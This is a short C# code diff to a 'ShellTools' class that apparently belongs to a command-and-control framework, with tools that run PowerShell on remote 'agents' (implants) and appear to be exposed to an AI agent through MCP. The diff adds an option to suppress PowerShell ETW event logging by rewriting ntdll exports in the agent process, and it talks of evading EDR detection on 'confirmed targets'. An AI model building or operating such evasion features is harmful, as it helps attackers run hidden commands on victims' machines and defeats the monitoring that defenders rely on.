@@ -26,9 +26,12 @@ public sealed class ShellTools
         AgentService agents,
         [Description("Target agent ID")] string agentId,
         [Description("PowerShell command or script")] string command,
-        [Description("Timeout in seconds (default 30)")] int timeoutSeconds = 30)
+        [Description("Timeout in seconds (default 30)")] int timeoutSeconds = 30,
+        [Description("Suppress PowerShell ETW event logs during execution (default false; rewrites ntdll ETW exports in the agent process — EDR behavior-detection risk, only enable on confirmed targets)")] bool etwSuppress = false)
     {
+        var arguments = new List<string>();
+        if (etwSuppress) arguments.Add("etwSuppress=true");
         return await McpUtils.CreateTaskAndWait(
-            taskService, agents, agentId, CommandType.PowerShell, command, timeoutSeconds);
+            taskService, agents, agentId, CommandType.PowerShell, command, timeoutSeconds, arguments);
     }
 }
